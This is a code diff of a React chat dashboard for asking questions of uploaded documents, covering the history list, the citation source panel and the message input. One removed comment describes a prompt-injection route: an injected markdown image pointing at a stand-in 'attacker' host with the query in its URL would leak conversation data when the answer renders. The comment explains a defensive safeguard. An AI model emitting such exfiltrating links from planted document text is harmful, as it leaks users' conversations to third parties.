+        {recentChats.map(chat => {
+          const active = sessionId === chat.id;
+          return (
+            <li key={chat.id} className={`group relative rounded-lg border transition-colors ${active ? 'bg-indigo-50/80 border-indigo-100' : 'border-transparent hover:bg-white hover:border-slate-200'}`}>
+              <button
+                type="button"
+                onClick={() => selectSession(chat.id)}
+                aria-current={active ? 'true' : undefined}
+                className="w-full text-left p-2.5 pr-16 rounded-lg"
+              >
+                <span className={`block text-xs truncate ${active ? 'font-semibold text-indigo-900' : 'font-medium text-slate-900'}`}>{chat.title}</span>
+                <span className={`block text-[11px] mt-0.5 ${active ? 'text-indigo-700' : 'text-slate-500'}`}>
+                  {chat.created_at ? new Date(chat.created_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric' }) : ' '}
+                </span>
+              </button>
+              <div className="absolute right-1.5 top-1/2 -translate-y-1/2 flex items-center gap-0.5 opacity-0 group-hover:opacity-100 focus-within:opacity-100 [@media(hover:none)]:opacity-100 transition-opacity">
+                <button type="button" onClick={() => openRename(chat)} className="p-1.5 rounded text-slate-500 hover:text-indigo-600 hover:bg-white" aria-label={`Rename “${chat.title}”`}>
+                  <Pencil size={13} aria-hidden="true" />
+                </button>
+                <button type="button" onClick={() => { setMobilePanel(null); setDeleteTarget(chat); }} className="p-1.5 rounded text-slate-500 hover:text-red-600 hover:bg-white" aria-label={`Delete “${chat.title}”`}>
+                  <Trash2 size={13} aria-hidden="true" />
+                </button>
+              </div>
+            </li>
+          );
+        })}
+      </ul>
+    )
+  );
+
+  const renderSources = (idPrefix: 'panel' | 'sheet') => (
+    !activeSource ? (
+      <div className="text-center text-slate-500 text-sm pt-12 space-y-2">
+        <BookOpen className="w-8 h-8 mx-auto opacity-40" aria-hidden="true" />
+        <p>Select a citation in an answer to see the passage it came from.</p>
+      </div>
+    ) : (
+      <ul className="space-y-3">
+        {activeSource.citations.map((c, i) => {
+          const focused = i === activeSource.focusIdx;
+          return (
+            <li key={i}>
+              <button
+                type="button"
+                id={`${idPrefix}-cite-${i}`}
+                onClick={() => setActiveSource({ ...activeSource, focusIdx: i })}
+                aria-current={focused ? 'true' : undefined}
+                className={`block w-full text-left p-3.5 rounded-lg border transition-colors ${focused ? 'border-indigo-200 bg-indigo-50/50 ring-1 ring-indigo-200/50' : 'border-slate-200 bg-slate-50/70 hover:border-slate-300'}`}
+              >
+                <span className={`block mb-1.5 font-semibold text-[11px] truncate ${focused ? 'text-indigo-700' : 'text-slate-700'}`}>
+                  [{c.evidence_id || `E${i + 1}`}] {c.section_title || c.filename}{c.page_start ? ` · p.${c.page_start}` : ''}
+                </span>
+                <span className="block font-mono text-xs text-slate-900 leading-relaxed whitespace-pre-wrap select-text">{c.content}</span>
+              </button>
+            </li>
+          );
+        })}
+      </ul>
+    )
+  );
+
+  const sourceTitle = activeSource ? activeSource.citations[activeSource.focusIdx]?.filename ?? 'Sources' : 'Sources';
 
   return (
-    <div className="flex h-full bg-white text-slate-900 overflow-hidden relative">
+    <div className="flex-1 min-h-0 flex bg-white text-slate-900 overflow-hidden relative">
       <ToastContainer toasts={toasts} onDismiss={dismissToast} />
 
-      {/* Upload Progress Modal — matches Stitch design */}
+      <input
+        type="file"
+        ref={fileInputRef}
+        onChange={e => uploadFiles(e.target.files || [])}
+        className="hidden"
+        accept=".pdf,.txt,.docx,.csv,.xlsx"
+        multiple
+        tabIndex={-1}
+        aria-hidden="true"
+      />
+
       <UploadProgressModal
         isOpen={showUploadModal}
         boxName={boxName}
-        files={uploadFileItems}
+        files={uploadView}
         onClose={() => setShowUploadModal(false)}
-        onCancelAll={() => {
-          setShowUploadModal(false);
-          setUploadFileItems([]);
-        }}
-        onRemoveFile={(filename) => {
-          setUploadFileItems(prev => prev.filter(f => f.filename !== filename));
-        }}
       />
 
       {currentView === 'documents' && (
-        <>
-          <KnowledgeBaseView
-            boxId={boxId}
-            boxName={boxName}
-            documents={documents}
-            isUploading={isUploading}
-            onUploadClick={() => fileInputRef.current?.click()}
-            onDeleteFile={handleDeleteFile}
-            onFilesSelected={uploadFiles}
-            onOpenChat={() => setCurrentView('chat')}
-          />
-          <input type="file" ref={fileInputRef} onChange={handleFileUpload} className="hidden" accept=".pdf,.txt,.docx,.csv,.xlsx" multiple />
-        </>
+        <KnowledgeBaseView
+          boxName={boxName}
+          documents={documents}
+          isUploading={isUploading}
+          onUploadClick={() => fileInputRef.current?.click()}
+          onDeleteFile={handleDeleteFile}
+          onFilesSelected={uploadFiles}
+          onOpenChat={() => setCurrentView('chat')}
+        />
       )}
 
-      {/* ── Main Workspace: History + Chat + Source Panel ── */}
       {currentView === 'chat' && (
-        <div className="flex-1 flex flex-col h-full min-w-0 bg-white">
-          <header className="h-14 border-b border-slate-200 bg-white px-4 md:px-6 flex items-center justify-between shrink-0 z-20">
-            <div className="flex items-center gap-3 md:gap-4 min-w-0">
-              <div className="flex items-center gap-2 min-w-0">
-                <FolderOpen className="text-slate-400 w-5 h-5 shrink-0" />
-                <h1 className="text-sm font-semibold text-slate-900 truncate tracking-tight font-headline">{boxName}</h1>
-              </div>
-              <span className="h-4 w-[1px] bg-slate-200 hidden sm:block" />
-              <div className="hidden sm:flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-emerald-50 text-xs font-medium text-emerald-700 border border-emerald-200/60">
-                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
-                <span>{activeDocCount} documents active</span>
-              </div>
+        <div className="flex-1 flex flex-col min-h-0 min-w-0 bg-white">
+          <header className="h-14 border-b border-slate-200 bg-white px-3 sm:px-4 md:px-6 flex items-center justify-between gap-3 shrink-0 z-20">
+            <div className="flex items-center gap-3 min-w-0">
+              <FolderOpen className="text-slate-400 w-5 h-5 shrink-0" aria-hidden="true" />
+              <h1 className="text-sm font-semibold text-slate-900 truncate tracking-tight font-headline">{boxName}</h1>
+              <span className="hidden sm:inline-flex shrink-0 items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-slate-50 text-xs font-medium text-slate-600 border border-slate-200">
+                {readyCount} document{readyCount === 1 ? '' : 's'} ready
+              </span>
             </div>
-            <div className="flex items-center gap-2">
+            <div className="flex items-center gap-1.5 sm:gap-2 shrink-0">
               <button
-                id="toggle-history-btn"
-                onClick={() => setHistoryOpen(o => !o)}
-                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium transition-colors ${historyOpen ? 'bg-slate-100 text-slate-900' : 'bg-white text-slate-600 hover:bg-slate-50 hover:text-slate-900'}`}
-                title="Toggle Chat History"
+                type="button"
+                onClick={toggleHistory}
+                aria-pressed={panels.historyOpen}
+                aria-label="Conversation history"
+                className={`flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium transition-colors ${panels.historyOpen ? 'md:bg-slate-100 md:text-slate-900' : ''} text-slate-600 hover:bg-slate-50 hover:text-slate-900`}
               >
-                <History className="w-3.5 h-3.5 text-slate-500" />
+                <History className="w-3.5 h-3.5" aria-hidden="true" />
                 <span className="hidden sm:inline">History</span>
-                <span className="px-1.5 rounded-full bg-white text-[10px] text-slate-600 font-mono border border-slate-200">{recentChats.length}</span>
               </button>
               <button
+                type="button"
                 onClick={() => setCurrentView('documents')}
-                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium text-slate-600 hover:text-slate-900 hover:bg-slate-50 transition-colors"
+                aria-label="Documents"
+                className="flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium text-slate-600 hover:text-slate-900 hover:bg-slate-50 transition-colors"
               >
-                <FileText className="w-3.5 h-3.5" />
-                <span className="hidden sm:inline">Manage Documents</span>
+                <FileText className="w-3.5 h-3.5" aria-hidden="true" />
+                <span className="hidden sm:inline">Documents</span>
               </button>
               <button
-                id="toggle-source-btn"
-                onClick={() => setShowSourcePanel(o => !o)}
-                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium transition-colors ${showSourcePanel ? 'bg-slate-100 text-slate-900' : 'bg-white text-slate-600 hover:bg-slate-50 hover:text-slate-900'}`}
-                title="Toggle Document Inspection Panel"
+                type="button"
+                onClick={toggleSources}
+                aria-pressed={panels.sourceOpen}
+                aria-label="Sources"
+                className={`relative flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium transition-colors ${panels.sourceOpen ? 'md:bg-slate-100 md:text-slate-900' : ''} text-slate-600 hover:bg-slate-50 hover:text-slate-900`}
               >
-                <BookOpen className="w-3.5 h-3.5" />
-                <span className="hidden sm:inline">Source Panel</span>
+                <BookOpen className="w-3.5 h-3.5" aria-hidden="true" />
+                <span className="hidden sm:inline">Sources</span>
+                {activeSource && <span className="md:hidden absolute -top-1 -right-1 w-2 h-2 rounded-full bg-indigo-600" aria-hidden="true" />}
               </button>
             </div>
           </header>
 
-          <main id="chat-main" className="flex-1 flex overflow-hidden relative">
-            {/* ── Chat History Sidebar (resizable / collapsible to icon rail) ── */}
-            {historyOpen ? (
-              <aside id="chat-history-sidebar" style={{ width: historyWidth }} className="relative shrink-0 border-r border-slate-200 bg-slate-50/50 hidden md:flex flex-col h-full">
-                <div className="h-12 px-4 border-b border-slate-200 flex items-center justify-between shrink-0 bg-slate-50/80">
-                  <div className="flex items-center gap-2">
-                    <MessageSquare className="w-4 h-4 text-slate-500" />
-                    <span className="text-xs font-semibold text-slate-900 tracking-tight font-headline">Chat History</span>
-                  </div>
-                  <button onClick={() => setHistoryOpen(false)} className="p-1 rounded text-slate-400 hover:text-slate-700 hover:bg-slate-100 transition-colors" title="Collapse">
-                    <PanelLeftClose size={15} />
+          <div ref={workspaceRef} className="flex-1 flex min-h-0 overflow-hidden relative">
+            {/* ── Conversation history (desktop) ── */}
+            {panels.historyOpen ? (
+              <aside aria-label="Conversation history" style={{ width: panels.historyWidth }} className="relative shrink-0 border-r border-slate-200 bg-slate-50/50 hidden md:flex flex-col min-h-0">
+                <div className="h-12 px-4 border-b border-slate-200 flex items-center justify-between shrink-0">
+                  <h2 className="flex items-center gap-2 text-xs font-semibold text-slate-900 tracking-tight font-headline">
+                    <MessageSquare className="w-4 h-4 text-slate-500" aria-hidden="true" />
+                    Conversations
+                  </h2>
+                  <button type="button" onClick={toggleHistory} className="p-1 rounded text-slate-500 hover:text-slate-700 hover:bg-slate-100 transition-colors" aria-label="Hide conversation history">
+                    <PanelLeftClose size={15} aria-hidden="true" />
                   </button>
                 </div>
                 <div className="p-3 border-b border-slate-200/80">
-                  <button onClick={() => { setSessionId(null); setMessages([]); setActiveSource(null); }} className="w-full flex items-center justify-center gap-1.5 py-1.5 px-3 rounded-lg bg-white hover:bg-slate-50 border border-slate-200 text-slate-800 text-xs font-medium transition-colors shadow-xs group">
-                    <Plus size={14} className="text-indigo-600 group-hover:scale-110 transition-transform" />
-                    New Chat
+                  <button type="button" onClick={startNewChat} className="w-full flex items-center justify-center gap-1.5 py-1.5 px-3 rounded-lg bg-white hover:bg-slate-50 border border-slate-200 text-slate-800 text-xs font-medium transition-colors shadow-xs">
+                    <Plus size={14} className="text-indigo-600" aria-hidden="true" />
+                    New conversation
                   </button>
                 </div>
-                <div className="flex-1 overflow-y-auto p-2 space-y-1">
-                  <div className="text-[10px] font-semibold text-slate-400 uppercase tracking-wider px-2 pt-2 pb-1 font-mono">Recent Threads</div>
-                  {recentChats.map(chat => {
-                    const active = sessionId === chat.id;
-                    return (
-                      <div key={chat.id} onClick={() => { setSessionId(chat.id); setActiveSource(null); }}
-                        className={`group p-2.5 rounded-lg cursor-pointer transition-all border ${active ? 'bg-indigo-50/80 border-indigo-100 shadow-xs' : 'border-transparent hover:bg-white hover:border-slate-200'}`}>
-                        <div className="flex items-center justify-between gap-1 mb-1">
-                          <span className={`text-xs truncate tracking-tight ${active ? 'font-semibold text-indigo-900' : 'font-medium text-slate-900'}`}>{chat.title}</span>
-                          {active && <span className="w-1.5 h-1.5 rounded-full bg-indigo-600 shrink-0 group-hover:hidden" />}
-                          <div className="hidden group-hover:flex items-center gap-0.5 shrink-0">
-                            <button onClick={(e) => { e.stopPropagation(); handleRenameChat(chat); }} className="p-0.5 rounded text-slate-400 hover:text-indigo-600" title="Rename"><Pencil size={11} /></button>
-                            <button onClick={(e) => { e.stopPropagation(); handleDeleteChat(chat); }} className="p-0.5 rounded text-slate-400 hover:text-red-600" title="Delete"><Trash2 size={11} /></button>
-                          </div>
-                        </div>
-                        <div className={`text-[11px] ${active ? 'text-indigo-600/80' : 'text-slate-400'}`}>
-                          {active ? 'Active session' : chat.created_at ? new Date(chat.created_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric' }) : ''}
-                        </div>
-                      </div>
-                    );
-                  })}
-                  {recentChats.length === 0 && <div className="text-xs text-slate-400 text-center mt-6">No conversations yet</div>}
-                </div>
-                <div className="p-3 border-t border-slate-200 bg-slate-50/80 text-[11px] text-slate-500">
-                  Total {recentChats.length} conversation{recentChats.length === 1 ? '' : 's'}
-                </div>
-                {/* Resize handle */}
-                <div onMouseDown={startResize('history')} className="absolute top-0 -right-1 w-2 h-full cursor-col-resize z-10 group">
-                  <div className="mx-auto w-[2px] h-full bg-transparent group-hover:bg-indigo-400 transition-colors" />
+                <div className="flex-1 overflow-y-auto p-2">{renderHistoryList()}</div>
+                {/* Mouse-only convenience; keyboard users keep the default width. */}
+                <div onMouseDown={e => startResize(e, 'history')} className="absolute top-0 -right-1 w-2 h-full cursor-col-resize z-10 group" aria-hidden="true">
+                  <div className="mx-auto w-0.5 h-full bg-transparent group-hover:bg-indigo-400 transition-colors" />
                 </div>
               </aside>
             ) : (
-              <aside className="w-12 shrink-0 border-r border-slate-200 bg-slate-50/50 hidden md:flex flex-col items-center py-3 gap-2">
-                <button onClick={() => setHistoryOpen(true)} className="p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" title="Show Chat History">
-                  <History size={18} />
+              <div className="w-12 shrink-0 border-r border-slate-200 bg-slate-50/50 hidden md:flex flex-col items-center py-3 gap-2">
+                <button type="button" onClick={toggleHistory} className="p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" aria-label="Show conversation history">
+                  <History size={18} aria-hidden="true" />
                 </button>
-                <button onClick={() => { setSessionId(null); setMessages([]); setActiveSource(null); }} className="p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" title="New Chat">
-                  <Plus size={18} />
+                <button type="button" onClick={startNewChat} className="p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" aria-label="New conversation">
+                  <Plus size={18} aria-hidden="true" />
                 </button>
-              </aside>
+              </div>
             )}
 
-            {/* ── Chat ── */}
-            <section className="flex-1 flex flex-col h-full min-w-0 bg-white relative">
-              <div className="flex-1 overflow-y-auto px-4 md:px-6 py-8 bg-white">
-                <div className="max-w-3xl mx-auto space-y-8 pb-8">
-                  {messages.length === 0 && (
-                    <div className="h-full flex flex-col items-center justify-center text-center pt-20 space-y-4">
-                      <div className="w-14 h-14 rounded-2xl bg-indigo-50 border border-indigo-100 flex items-center justify-center">
-                        <Sparkles size={26} className="text-indigo-600 opacity-70" />
-                      </div>
+            {/* ── Conversation ── */}
+            <section aria-label="Conversation" className="flex-1 flex flex-col min-h-0 min-w-0 bg-white">
+              <div className="flex-1 overflow-y-auto px-4 md:px-6 py-6 md:py-8">
+                <div className="max-w-3xl mx-auto space-y-8 pb-4">
+                  {messages.length === 0 && !loadingHistory && (
+                    <div className="flex flex-col items-center justify-center text-center pt-12 md:pt-20 space-y-4">
+                      <LogoMark className="w-14 h-14" />
                       <div className="space-y-2">
-                        <h3 className="text-lg font-semibold text-slate-900 font-headline">Ask a question</h3>
-                        <p className="text-sm text-slate-500 max-w-sm">Ask a question about documents in this Box to retrieve grounded, cited answers.</p>
+                        <h2 className="text-lg font-semibold text-slate-900 font-headline">Ask about your documents</h2>
+                        <p className="text-sm text-slate-500 max-w-sm">
+                          {readyCount > 0
+                            ? 'Answers are drawn only from the documents in this box and link to the passages they cite.'
+                            : 'This box has no ready documents yet. Upload some first so there is something to answer from.'}
+                        </p>
                       </div>
+                      {readyCount === 0 && (
+                        <button type="button" onClick={() => setCurrentView('documents')} className={buttonStyles.secondary}>
+                          <FileText className="w-4 h-4" aria-hidden="true" /> Go to documents
+                        </button>
+                      )}
                     </div>
                   )}
 
+                  {loadingHistory && (
+                    <p className="flex items-center justify-center gap-2 text-sm text-slate-500 pt-12" role="status">
+                      <Loader2 className="w-4 h-4 animate-spin" aria-hidden="true" /> Loading conversation…
+                    </p>
+                  )}
+
                   {messages.map((msg, idx) => (
-                    <div key={idx} className="flex gap-4 items-start">
-                      <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 mt-0.5 ${msg.role === 'user' ? 'bg-slate-100 border border-slate-200' : msg.error ? 'bg-red-50 border border-red-200' : 'bg-indigo-50 border border-indigo-100'}`}>
-                        {msg.role === 'user' ? <span className="text-[10px] font-semibold text-slate-600">You</span>
-                          : msg.error ? <AlertCircle className="w-4 h-4 text-red-500" />
-                            : <Sparkles className="w-4 h-4 text-indigo-600" />}
+                    <article key={idx} className="flex gap-3 sm:gap-4 items-start" aria-label={msg.role === 'user' ? 'Your question' : 'DocIntel answer'}>
+                      <div className="w-8 h-8 shrink-0 mt-0.5" aria-hidden="true">
+                        {msg.role === 'user' ? (
+                          <span className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-[10px] font-semibold text-slate-600">You</span>
+                        ) : msg.error ? (
+                          <span className="w-8 h-8 rounded-lg bg-red-50 border border-red-200 flex items-center justify-center"><AlertCircle className="w-4 h-4 text-red-500" /></span>
+                        ) : (
+                          <LogoMark className="w-8 h-8" />
+                        )}
                       </div>
                       <div className="flex-1 min-w-0 space-y-3">
-                        <div className="flex items-center gap-2">
-                          <span className={`text-xs font-semibold tracking-tight ${msg.role === 'user' ? 'text-slate-500' : 'text-slate-900 font-headline'}`}>{msg.role === 'user' ? 'You' : 'DocIntel Synthesizer'}</span>
-                          {msg.role === 'ai' && !msg.error && (
-                            <span className="text-[10px] text-emerald-700 font-medium px-2 py-0.5 rounded-md bg-emerald-50 border border-emerald-200">Verified against {activeDocCount} files</span>
-                          )}
-                        </div>
-                        <div className={`text-[15px] leading-relaxed ${msg.error ? 'text-red-700' : 'text-slate-800'}`}>
-                          <div className={`prose prose-sm max-w-none ${msg.error ? '' : 'prose-slate'}`}>
-                            <ReactMarkdown
-                              components={{
-                                a: ({ node, ...props }) => {
-                                  if (props.href?.startsWith('#cite-')) {
-                                    const cIdx = parseInt(props.href.replace('#cite-', ''));
-                                    if (!isNaN(cIdx) && msg.citations) {
-                                      return (
-                                        <button
-                                          onClick={(e) => { 
-                                            e.preventDefault(); 
-                                            const clickedCitation = msg.citations![cIdx];
-                                            const filteredCitations = msg.citations!.filter(orig => (orig.evidence_id || orig.filename) === (clickedCitation.evidence_id || clickedCitation.filename));
-                                            const newFocusIdx = filteredCitations.findIndex(orig => orig === clickedCitation);
-                                            openCitation(filteredCitations, newFocusIdx === -1 ? 0 : newFocusIdx); 
-                                          }}
-                                          className="inline-flex items-center justify-center px-1.5 py-0.5 rounded bg-indigo-50 border border-indigo-200 text-indigo-700 hover:bg-indigo-100 font-mono text-[10px] font-bold mx-0.5 align-baseline transition-colors"
-                                          title={msg.citations[cIdx]?.filename}
-                                        >
-                                          {props.children}
-                                        </button>
-                                      );
-                                    }
-                                  }
-                                  // Answers can echo text planted in uploaded documents, so links are
-                                  // limited to http(s) and opened without leaking referrer or opener.
-                                  const href = props.href || '';
-                                  if (!/^https?:\/\//i.test(href)) return <span>{props.children}</span>;
-                                  return <a {...props} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer" />;
-                                },
-                                // Never fetch remote images: a prompt-injected ![](https://attacker/?q=...)
-                                // would otherwise send conversation data to a third party on render.
-                                img: ({ alt }) => (alt ? <span>[image: {alt}]</span> : null),
-                              }}
-                            >
-                              {msg.content.replace(/(?:\[|【)(E?\d+)(?:\]|】)/g, (match, p1) => {
-                                if (!msg.citations) return match;
-                                const searchId = p1.startsWith('E') ? p1 : `E${p1}`;
-                                let idx = msg.citations.findIndex(c => c.evidence_id === searchId);
-                                if (idx === -1) {
-                                  const num = parseInt(p1.replace('E', ''));
-                                  if (!isNaN(num) && num > 0 && num <= msg.citations.length) idx = num - 1;
-                                }
-                                if (idx !== -1) return `[${match}](#cite-${idx})`;
-                                return match;
-                              })}
-                            </ReactMarkdown>
-                          </div>
+                        <p className={`text-xs font-semibold tracking-tight ${msg.role === 'user' ? 'text-slate-500' : 'text-slate-900 font-headline'}`}>
+                          {msg.role === 'user' ? 'You' : 'DocIntel'}
+                        </p>
+                        <div className={`text-[15px] leading-relaxed wrap-break-word ${msg.error ? 'text-red-700' : 'text-slate-800'}`}>
+                          {msg.role === 'user'
+                            ? <p className="whitespace-pre-wrap">{msg.content}</p>
+                            : <AnswerMarkdown message={msg} onCite={openCitation} />}
                         </div>
 
                         {msg.error && (
-                          <button onClick={() => { const lastUserMsg = messages.slice(0, idx).reverse().find(m => m.role === 'user'); if (lastUserMsg) handleSendMessage(lastUserMsg.content); }}
-                            className="flex items-center gap-2 text-xs font-medium text-red-600 hover:text-red-800 transition-colors">
-                            <RefreshCw size={12} /> Retry
+                          <button
+                            type="button"
+                            onClick={() => { const lastUserMsg = messages.slice(0, idx).reverse().find(m => m.role === 'user'); if (lastUserMsg) handleSendMessage(lastUserMsg.content); }}
+                            disabled={isProcessing}
+                            className="flex items-center gap-2 text-xs font-medium text-red-700 hover:text-red-900 transition-colors disabled:opacity-50"
+                          >
+                            <RefreshCw size={12} aria-hidden="true" /> Try again
                           </button>
                         )}
 
-                        {/* Citation cards */}
                         {msg.role === 'ai' && !msg.error && msg.citations && msg.citations.length > 0 && (
                           <div className="space-y-2 pt-1">
-                            {Array.from(new Map(msg.citations.map(c => [c.evidence_id || c.filename, c])).values()).map((c, cIdx) => (
-                              <div key={cIdx} className="p-3 rounded-xl bg-slate-50/80 border border-slate-200/90 hover:border-indigo-200 transition-colors">
-                                <div className="flex items-center justify-between gap-2">
-                                  <span className="text-xs font-semibold text-indigo-600 tracking-tight font-headline shrink-0">{c.evidence_id ? c.evidence_id : `[E${cIdx + 1}]`}</span>
-                                  <button onClick={() => {
-                                      const filtered = msg.citations!.filter(orig => (orig.evidence_id || orig.filename) === (c.evidence_id || c.filename));
-                                      openCitation(filtered, 0);
-                                    }}
-                                    className="inline-flex items-center gap-1.5 text-xs text-slate-600 hover:text-indigo-600 transition-colors bg-white px-2 py-1 rounded-md border border-slate-200 shadow-xs min-w-0">
-                                    <Link2 size={12} className="text-slate-400 shrink-0" />
+                            <p className="text-xs font-medium text-slate-500">Sources</p>
+                            {Array.from(new Map(msg.citations.map(c => [citationKey(c), c])).values()).map((c, cIdx) => (
+                              <div key={cIdx} className="p-3 rounded-xl bg-slate-50/80 border border-slate-200/90">
+                                <div className="flex items-center gap-2 min-w-0">
+                                  <span className="text-xs font-semibold text-indigo-600 font-headline shrink-0">{c.evidence_id ? c.evidence_id : `E${cIdx + 1}`}</span>
+                                  <button
+                                    type="button"
+                                    onClick={() => openCitation(msg.citations!.filter(orig => citationKey(orig) === citationKey(c)), 0)}
+                                    className="inline-flex items-center gap-1.5 text-xs text-slate-700 hover:text-indigo-600 transition-colors bg-white px-2 py-1 rounded-md border border-slate-200 shadow-xs min-w-0"
+                                  >
+                                    <Link2 size={12} className="text-slate-400 shrink-0" aria-hidden="true" />
                                     <span className="truncate">{citationLabel(c)}</span>
                                   </button>
                                 </div>
@@ -640,35 +798,36 @@ export default function SecureBrainDashboard({ boxId, boxName }: { boxId: string
                           </div>
                         )}
 
-                        {/* Closest Matches (Fallback) */}
                         {msg.role === 'ai' && !msg.error && msg.closest_matches && msg.closest_matches.length > 0 && (
-                          <div className="space-y-2 pt-1 mt-4 border-t border-slate-100">
-                            <p className="text-xs font-semibold text-amber-600 mb-2 flex items-center gap-1">
-                              <AlertCircle size={14} /> Here are the closest matches found (relevance is low):
+                          <div className="space-y-2 pt-4 mt-4 border-t border-slate-100">
+                            <p className="text-xs font-semibold text-amber-800 flex items-center gap-1.5">
+                              <AlertCircle size={14} aria-hidden="true" /> Closest passages found (low relevance)
                             </p>
                             {msg.closest_matches.map((c, cIdx) => (
-                              <div key={`fallback-${cIdx}`} className="p-3 rounded-xl bg-amber-50/50 border border-amber-200/90 hover:border-amber-300 transition-colors">
-                                <div className="flex items-center justify-between gap-2">
-                                  <button onClick={() => {
-                                      const filtered = [c];
-                                      openCitation(filtered, 0);
-                                    }}
-                                    className="inline-flex items-center gap-1.5 text-xs text-slate-600 hover:text-amber-700 transition-colors bg-white px-2 py-1 rounded-md border border-slate-200 shadow-xs min-w-0">
-                                    <Link2 size={12} className="text-slate-400 shrink-0" />
-                                    <span className="truncate">{citationLabel(c)}</span>
-                                  </button>
-                                </div>
+                              <div key={`fallback-${cIdx}`} className="p-3 rounded-xl bg-amber-50/50 border border-amber-200/90">
+                                <button
+                                  type="button"
+                                  onClick={() => openCitation([c], 0)}
+                                  className="inline-flex items-center gap-1.5 text-xs text-slate-700 hover:text-amber-800 transition-colors bg-white px-2 py-1 rounded-md border border-slate-200 shadow-xs min-w-0 max-w-full"
+                                >
+                                  <Link2 size={12} className="text-slate-400 shrink-0" aria-hidden="true" />
+                                  <span className="truncate">{citationLabel(c)}</span>
+                                </button>
                                 <p className="text-sm text-slate-600 leading-relaxed mt-2 line-clamp-2">{c.content}</p>
                               </div>
                             ))}
                           </div>
                         )}
                       </div>
-                    </div>
+                    </article>
                   ))}
+
+                  <div aria-live="polite" className="sr-only">
+                    {isProcessing ? 'Searching your documents…' : ''}
+                  </div>
                   {isProcessing && (
-                    <div className="flex gap-4 items-center text-sm text-slate-500">
-                      <div className="w-8 h-8 rounded-lg bg-indigo-50 border border-indigo-100 flex items-center justify-center"><Loader2 className="w-4 h-4 text-indigo-600 animate-spin" /></div>
+                    <div className="flex gap-3 sm:gap-4 items-center text-sm text-slate-500" aria-hidden="true">
+                      <span className="w-8 h-8 rounded-lg bg-indigo-50 border border-indigo-100 flex items-center justify-center"><Loader2 className="w-4 h-4 text-indigo-600 animate-spin" /></span>
                       Searching your documents…
                     </div>
                   )}
@@ -676,99 +835,146 @@ export default function SecureBrainDashboard({ boxId, boxName }: { boxId: string
                 </div>
               </div>
 
-              <div className="p-4 bg-white border-t border-slate-200">
+              <form
+                className="p-3 sm:p-4 bg-white border-t border-slate-200"
+                onSubmit={e => { e.preventDefault(); handleSendMessage(); }}
+              >
                 <div className="max-w-3xl mx-auto">
-                  <div className="relative flex items-center bg-white border border-slate-200 rounded-xl focus-within:border-indigo-500 focus-within:ring-2 focus-within:ring-indigo-100 transition-all shadow-xs">
-                    <button onClick={() => fileInputRef.current?.click()} disabled={isUploading} className="p-3 text-slate-400 hover:text-slate-700 transition-colors" title="Attach Document to Box">
-                      {isUploading ? <Loader2 size={20} className="animate-spin" /> : <Paperclip size={20} />}
+                  <div className="flex items-end bg-white border border-slate-300 rounded-xl focus-within:border-indigo-500 focus-within:ring-2 focus-within:ring-indigo-100 transition-colors shadow-xs">
+                    <button
+                      type="button"
+                      onClick={() => fileInputRef.current?.click()}
+                      disabled={isUploading}
+                      className="p-3 text-slate-500 hover:text-slate-800 transition-colors disabled:opacity-50"
+                      aria-label={isUploading ? 'Uploading documents' : 'Upload documents to this box'}
+                    >
+                      {isUploading ? <Loader2 size={20} className="animate-spin" aria-hidden="true" /> : <Paperclip size={20} aria-hidden="true" />}
                     </button>
-                    <input
-                      className="flex-1 bg-transparent border-0 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-0 py-3.5 px-1"
-                      placeholder="Ask a question about documents in this Box..."
+                    <label htmlFor="chat-input" className="sr-only">Ask a question about the documents in this box</label>
+                    <textarea
+                      id="chat-input"
+                      ref={inputRef}
+                      rows={1}
+                      className="flex-1 resize-none bg-transparent border-0 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-0 py-3.5 px-1 leading-5"
+                      style={{ maxHeight: MAX_INPUT_HEIGHT }}
+                      placeholder="Ask a question about this box…"
                       value={inputText}
-                      onChange={e => setInputText(e.target.value)}
-                      onKeyDown={e => e.key === 'Enter' && !e.shiftKey && handleSendMessage()}
+                      onChange={e => { setInputText(e.target.value); resizeInput(); }}
+                      onKeyDown={e => {
+                        // Enter sends, Shift+Enter adds a line; ignore Enter while an IME is composing.
+                        if (e.key === 'Enter' && !e.shiftKey && !e.nativeEvent.isComposing) {
+                          e.preventDefault();
+                          handleSendMessage();
+                        }
+                      }}
+                      aria-describedby="chat-input-hint"
                     />
-                    <div className="flex items-center gap-1.5 pr-2">
-                      <button onClick={() => handleSendMessage()} disabled={isProcessing || !inputText.trim()}
-                        className="p-2 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white transition-colors flex items-center justify-center shadow-xs disabled:opacity-50">
-                        {isProcessing ? <Loader2 size={16} className="animate-spin" /> : <Send size={16} />}
+                    <div className="p-2">
+                      <button
+                        type="submit"
+                        disabled={isProcessing || !inputText.trim()}
+                        className="p-2 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white transition-colors flex items-center justify-center shadow-xs disabled:opacity-50 disabled:cursor-not-allowed"
+                        aria-label="Send question"
+                      >
+                        {isProcessing ? <Loader2 size={16} className="animate-spin" aria-hidden="true" /> : <Send size={16} aria-hidden="true" />}
                       </button>
                     </div>
                   </div>
